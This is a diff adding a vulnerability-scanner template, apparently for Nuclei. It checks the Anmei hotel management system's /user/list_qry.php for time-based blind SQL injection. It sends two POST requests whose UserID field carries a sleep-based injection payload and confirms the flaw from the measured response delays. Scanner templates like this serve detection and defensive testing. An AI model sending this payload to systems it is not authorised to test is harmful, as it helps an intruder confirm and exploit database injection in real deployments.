@@ -1,0 +1,33 @@
+id: anmeijiudian-list_qry_php-sql-time
+
+info:
+  name: 安美酒店管理系统 /list_qry.php SQL注入
+  author: HuanXiong
+  severity: high
+
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        POST /user/list_qry.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
+        Content-Type: application/x-www-form-urlencoded
+        
+        UserID=0'XOR(if(now()=sysdate()%2Csleep(4)%2C0))XOR'Z&starttime=2023-01-01&stoptime=2023-12-31
+        
+      - |
+        POST /user/list_qry.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
+        Content-Type: application/x-www-form-urlencoded
+
+        UserID=0'XOR(if(now()=sysdate()%2Csleep(8)%2C0))XOR'Z&starttime=2023-01-01&stoptime=2023-12-31
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=4 && duration_1<=5'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and
